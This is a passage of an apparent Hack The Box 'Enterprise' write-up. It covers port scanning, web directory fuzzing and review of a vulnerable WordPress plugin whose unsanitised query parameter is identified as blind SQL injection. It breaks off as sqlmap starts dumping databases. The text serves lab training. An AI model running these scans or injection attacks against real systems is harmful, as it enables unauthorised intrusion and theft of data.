@@ -1,0 +1,1848 @@
+I"�m<h1 id="masscan--nmap">Masscan + Nmap</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
+Discovered open port 32812/tcp on 10.10.10.61                                  
+Discovered open port 80/tcp on 10.10.10.61                                     
+Discovered open port 22/tcp on 10.10.10.61                                     
+Discovered open port 8080/tcp on 10.10.10.61  
+Discovered open port 443/tcp on 10.10.10.61
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Parse those ports to nmap:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+</pre></td> --><td class="rouge-code"><pre><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
+nmap <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Ubuntu 10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac <span class="o">(</span>RSA<span class="o">)</span>
+|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-generator: WordPress 4.8.1
+|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: USS Enterprise &amp;#8211<span class="p">;</span> Ships Log
+443/tcp open  ssl/http Apache httpd 2.4.25 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>enterprise.local/organizationName<span class="o">=</span>USS Enterprise/stateOrProvinceName<span class="o">=</span>United Federation of Planets/countryName<span class="o">=</span>UK
+| Not valid before: 2017-08-25T10:35:14
+|_Not valid after:  2017-09-24T10:35:14
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn:
+|_  http/1.1
+8080/tcp  open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-generator: Joomla! - Open Source Content Management
+|_http-open-proxy: Proxy might be redirecting requests
+| http-robots.txt: 15 disallowed entries
+| /joomla/administrator/ /administrator/ /bin/ /cache/
+| /cli/ /components/ /includes/ /installation/ /language/
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-title: Home
+32812/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines, GetRequest, HTTPOptions:
+|     _______ _______ ______ _______
+|     |_____| |_____/ |______
+|     |_____ |_____ | | | _ ______|
+|     Welcome to the Library Computer Access and Retrieval System
+|     Enter Bridge Access Code:
+|     Invalid Code
+|     Terminating Console
+|   NULL:
+|     _______ _______ ______ _______
+|     |_____| |_____/ |______
+|     |_____ |_____ | | | _ ______|
+|     Welcome to the Library Computer Access and Retrieval System
+|_    Enter Bridge Access Code:
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Added <code class="language-plaintext highlighter-rouge">enterpise.htb</code>, <code class="language-plaintext highlighter-rouge">enterprise.local</code> to /etc/hosts.</p>
+
+<p>I can give <code class="language-plaintext highlighter-rouge">wpscan</code> a try as I see wordpress installed on port 80. It find a username <code class="language-plaintext highlighter-rouge">william-riker</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://enterprise.htb <span class="nt">-e</span>
+
+<span class="o">[</span>+] URL: http://enterprise.htb/ <span class="o">[</span>10.10.10.61]
+<span class="o">[</span>+] Started: Sun Jul 25 21:38:58 2021
+
+<span class="o">[</span>+] Enumerating Vulnerable Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>
+
+<span class="o">[</span>i] No plugins Found.
+
+<span class="o">[</span>+] Enumerating Vulnerable Themes <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+ Checking Known Locations - Time: 00:00:07 &lt;<span class="o">===============================================================================================================&gt;</span> <span class="o">(</span>356 / 356<span class="o">)</span> 100.00% Time: 00:00:07
+
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] william.riker
+ | Found By: Author Posts - Display Name <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By:
+ |  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] william-riker
+ | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="web-80">Web 80</h2>
+<p>Directory fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://enterprise.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-e</span> .txt,.php,.html <span class="nt">-fc</span> 401,403,405                   
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://enterprise.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+ :: Extensions       : .txt .php .html
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 401,403,405
+________________________________________________
+
+wp-admin                [Status: 301, Size: 319, Words: 20, Lines: 10]
+wp-includes             [Status: 301, Size: 322, Words: 20, Lines: 10]
+wp-content              [Status: 301, Size: 321, Words: 20, Lines: 10]
+wp-login.php            [Status: 200, Size: 2428, Words: 150, Lines: 70]
+readme.html             [Status: 200, Size: 7413, Words: 760, Lines: 99]
+wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5]
+license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386]
+wp-settings.php         [Status: 200, Size: 370, Words: 34, Lines: 5]
+wp-links-opml.php       [Status: 200, Size: 224, Words: 13, Lines: 11]
+:: Progress: [252348/252348] :: Job [1/1] :: 193 req/sec :: Duration: [0:22:54] :: Errors: 0 ::
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="web-8080">Web 8080</h2>
+<p>Directory fuzzing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://enterprise.htb:8080/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-e</span> .txt,.php,.html <span class="nt">-fc</span> 401,403,405
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://enterprise.htb:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+ :: Extensions       : .txt .php .html
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 401,403,405
+________________________________________________
+
+cache                   [Status: 301, Size: 323, Words: 20, Lines: 10]
+templates               [Status: 301, Size: 327, Words: 20, Lines: 10]
+plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10]
+media                   [Status: 301, Size: 323, Words: 20, Lines: 10]
+index.php               [Status: 200, Size: 7704, Words: 345, Lines: 210]
+language                [Status: 301, Size: 326, Words: 20, Lines: 10]
+tmp                     [Status: 301, Size: 321, Words: 20, Lines: 10]
+administrator           [Status: 301, Size: 331, Words: 20, Lines: 10]
+components              [Status: 301, Size: 328, Words: 20, Lines: 10]
+bin                     [Status: 301, Size: 321, Words: 20, Lines: 10]
+libraries               [Status: 301, Size: 327, Words: 20, Lines: 10]
+images                  [Status: 301, Size: 324, Words: 20, Lines: 10]
+modules                 [Status: 301, Size: 325, Words: 20, Lines: 10]
+includes                [Status: 301, Size: 326, Words: 20, Lines: 10]
+LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340]
+files                   [Status: 301, Size: 323, Words: 20, Lines: 10]
+home                    [Status: 200, Size: 7695, Words: 345, Lines: 210]
+about                   [Status: 200, Size: 8170, Words: 402, Lines: 211]
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I do see a /administrator endpoint, which has a joomla login page. Tried default and common creds, they didn’t work.</p>
+<h2 id="web-443">Web 443</h2>
+<p>Directory bruteforcing</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> https://enterprise.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-e</span> .txt,.php,.html <span class="nt">-fc</span> 401,403,405
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://enterprise.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+ :: Extensions       : .txt .php .html
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 401,403,405
+________________________________________________
+
+index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
+files                   [Status: 301, Size: 318, Words: 20, Lines: 10]
+.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376]
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Visiting /files gives <code class="language-plaintext highlighter-rouge">lcars.zip</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>unzip lcars.zip
+Archive:  lcars.zip
+  inflating: lcars/lcars_db.php
+  inflating: lcars/lcars_dbpost.php
+  inflating: lcars/lcars.php
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>lcars.php</strong>:
+This file doesn’t have any code but some comments, which mentions user-interface isn’t created for these php files/pages.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td> --><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="cm">/*
+*     Plugin Name: lcars
+*     Plugin URI: enterprise.htb
+*     Description: Library Computer Access And Retrieval System
+*     Author: Geordi La Forge
+*     Version: 0.2
+*     Author URI: enterprise.htb
+*                             */</span>
+<span class="c1">// Need to create the user interface.</span>
+<span class="c1">// need to finsih the db interface</span>
+<span class="c1">// need to make it secure</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>lcars_dbpost.php</strong>:</p>
+<ul>
+  <li>Setups basic mysqli connection.</li>
+  <li>Checks for a parameter query being passed.</li>
+  <li>If that’s passed then first it’s changed to only integer. (Which spoils any chance of SQL injection)</li>
+  <li>Title for the post matching the ID passed in query variable is selected and printed.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td> --><td class="rouge-code"><pre>&lt;?php
+include <span class="s2">"/var/www/html/wp-config.php"</span><span class="p">;</span>
+<span class="nv">$db</span> <span class="o">=</span> new mysqli<span class="o">(</span>DB_HOST, DB_USER, DB_PASSWORD, DB_NAME<span class="o">)</span><span class="p">;</span>
+// Test the connection:
+<span class="k">if</span> <span class="o">(</span>mysqli_connect_errno<span class="o">()){</span>
+  // Connection Error
+  <span class="nb">exit</span><span class="o">(</span><span class="s2">"Couldn't connect to the database: "</span>.mysqli_connect_error<span class="o">())</span><span class="p">;</span>
+<span class="o">}</span>
+// <span class="nb">test </span>to retireve a post name
+<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'query'</span><span class="o">])){</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="o">(</span>int<span class="o">)</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'query'</span><span class="o">]</span><span class="p">;</span>
+  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT post_title FROM wp_posts WHERE ID = </span><span class="nv">$query</span><span class="s2">"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span>-&gt;query<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(</span><span class="nv">$result</span><span class="o">){</span>
+      <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span>-&gt;fetch_row<span class="o">()</span><span class="p">;</span>
+      <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$row</span><span class="o">[</span>0]<span class="o">)){</span>
+          <span class="nb">echo</span> <span class="nv">$row</span><span class="o">[</span>0]<span class="p">;</span>
+      <span class="o">}</span>
+  <span class="o">}</span>
+<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+  <span class="nb">echo</span> <span class="s2">"Failed to read query"</span><span class="p">;</span>
+<span class="o">}</span>
+?&gt;
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><strong>lcars_db.php</strong>:</p>
+<ul>
+  <li>Setups basic mysqli connection.</li>
+  <li>Checks for a parameter query being passed.</li>
+  <li>ID for the post matching the post name passed in query variable is selected and printed.
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td> --><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">include</span> <span class="s2">"/var/www/html/wp-config.php"</span><span class="p">;</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="no">DB_HOST</span><span class="p">,</span> <span class="no">DB_USER</span><span class="p">,</span> <span class="no">DB_PASSWORD</span><span class="p">,</span> <span class="no">DB_NAME</span><span class="p">);</span>
+<span class="c1">// Test the connection:</span>
+<span class="k">if</span> <span class="p">(</span><span class="nf">mysqli_connect_errno</span><span class="p">()){</span>
+  <span class="c1">// Connection Error</span>
+  <span class="k">exit</span><span class="p">(</span><span class="s2">"Couldn't connect to the database: "</span><span class="mf">.</span><span class="nf">mysqli_connect_error</span><span class="p">());</span>
+<span class="p">}</span>
+<span class="c1">// test to retireve an ID</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'query'</span><span class="p">])){</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'query'</span><span class="p">];</span>
+  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT ID FROM wp_posts WHERE post_name = </span><span class="nv">$query</span><span class="s2">"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="k">echo</span> <span class="s2">"Failed to read query"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <h1 id="foothold">Foothold</h1>
+    <h2 id="locating-php-files">Locating php files</h2>
+    <p>Trying to find where all these php files exist, I make a directory list which has all directories in port 80,8080 and php file names from zip, and fire it up on port 80, 443 and 8080.</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td> --><td class="rouge-code"><pre>wp-admin
+wp-includes
+wp-content
+cache
+templates
+plugins
+media
+language
+tmp
+administrator
+components
+bin
+libraries
+images
+modules
+includes
+files
+home
+about
+lcars
+lcars_db.php
+lcars_dbpost.php
+lcars.php
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Recursive directory brute-forcing port 80 with <code class="language-plaintext highlighter-rouge">feroxbuster</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://enterprise.htb/ <span class="nt">-w</span> ./list
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher                    ver: 2.2.1
+───────────────────────────┬──────────────────────
+     Target Url            │ http://enterprise.htb/
+     Threads               │ 50
+     Wordlist              │ ./list
+     Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405]
+     Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+     User-Agent            │ feroxbuster/2.2.1
+     Config File           │ /etc/feroxbuster/ferox-config.toml
+     Recursion Depth       │ 4
+     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+301        9l       28w      319c http://enterprise.htb/wp-admin
+301        9l       28w      321c http://enterprise.htb/wp-content
+301        9l       28w      322c http://enterprise.htb/wp-includes
+301        9l       28w      329c http://enterprise.htb/wp-includes/images
+301        9l       28w      329c http://enterprise.htb/wp-content/plugins
+301        9l       28w      326c http://enterprise.htb/wp-admin/images
+301        9l       28w      328c http://enterprise.htb/wp-admin/includes
+301        9l       28w      335c http://enterprise.htb/wp-content/plugins/lcars
+200        4l        0w        9c http://enterprise.htb/wp-content/plugins/lcars/lcars.php
+200        4l        4w       25c http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php
+200        1l        4w       22c http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php
+301        9l       28w      335c http://enterprise.htb/wp-includes/images/media
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>And we do find the <code class="language-plaintext highlighter-rouge">lcars</code> php pages in <code class="language-plaintext highlighter-rouge">wp-content/plugins</code> which makes sense since we got a zip and wordpress plugins are usually zip files.</p>
+
+<h2 id="lcars_dbpostphp">lcars_dbpost.php</h2>
+<p>Let’s try to access <code class="language-plaintext highlighter-rouge">lcars_dbpost.php</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>curl http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query<span class="o">=</span>1
+Hello world!
+<span class="nv">$ </span>curl http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query<span class="o">=</span>4
+Espresso
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Let’s make a loop:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..100<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Post </span><span class="nv">$i</span><span class="s2">: "</span><span class="p">;</span> curl <span class="nt">-s</span> http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query<span class="o">=</span><span class="nv">$i</span> | <span class="nb">tr</span> <span class="nt">-s</span> <span class="s1">'\n'</span><span class="p">;</span> <span class="k">done</span>  | <span class="nb">tee </span>post-name-list
+Post 1: Hello world! 
+Post 3: Auto Draft 
+Post 4: Espresso 
+Post 5: Sandwich 
+Post 6: Coffee 
+Post 7: Home 
+Post 8: About 
+Post 9: Contact 
+Post 10: Blog 
+Post 11: A homepage section 
+Post 13: enterprise_header 
+Post 14: Espresso 
+Post 15: Sandwich 
+Post 16: Coffee 
+Post 23: enterprise_header 
+Post 24: cropped-enterprise_header-1.jpg 
+Post 30: Home 
+Post 34: Yelp 
+Post 35: Facebook 
+Post 36: Twitter 
+Post 37: Instagram 
+Post 38: Email  
+Post 40: Hello world! 
+Post 51: Stardate 49827.5 
+Post 52: Stardate 49827.5 
+Post 53: Stardate 50893.5 
+Post 54: Stardate 50893.5 
+Post 55: Stardate 52179.4 
+Post 56: Stardate 52179.4 
+Post 57: Stardate 55132.2 
+Post 58: Stardate 55132.2 
+Post 66: Passwords 
+Post 67: Passwords 
+Post 68: Passwords 
+Post 69: YAYAYAYAY. 
+Post 70: YAYAYAYAY. 
+Post 71: <span class="nb">test 
+</span>Post 78: YAYAYAYAY. 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>I do see items 66-68 named Passwords.
+Visiting home-page shows a posts section redirecting to <code class="language-plaintext highlighter-rouge">http://enterprise.htb/?p=69</code>, which YAYAYAYAY. I tried to change that value to 66,67,68 nothing worked.</p>
+
+<h2 id="lcars_dbphp">lcars_db.php</h2>
+<p>Visiting <code class="language-plaintext highlighter-rouge">lcars_db.php</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-s</span> http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query<span class="o">=</span>1 
+
+Catchable fatal error: Object of class mysqli_result could not be converted to
+string <span class="k">in</span> /var/www/html/wp-content/plugins/lcars/lcars_db.php on line 16
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>That happens because even though lcars_db.php doesn’t have a (int) type change before passing the variable to sql query. 
+It doesn’t have the below code which fetches the query row and outputs it properly in form of string.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre> <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">){</span>
+        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_row</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])){</span>
+            <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>So this one becomes sort of Blind-SQL injection.</p>
+
+<h2 id="dumping-databases">Dumping databases</h2>
+<p>Using <code class="language-plaintext highlighter-rouge">sqlmap</code> to get databases:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query<span class="o">=</span>1 <span class="nt">--batch</span> <span class="nt">-dbms</span> mysql <span class="nt">--dbs</span>
+sqlmap <span class="nt">-u</span> http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query<span class="o">=</span>1 <span class="nt">--batch</span> <span class="nt">-dbms</span> mysql <span class="nt">--dbs</span>
+        ___
+       __H__
+ ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.5.4#stable<span class="o">}</span>
+|_ -| <span class="nb">.</span> <span class="o">[)]</span>     | .<span class="s1">'| . |
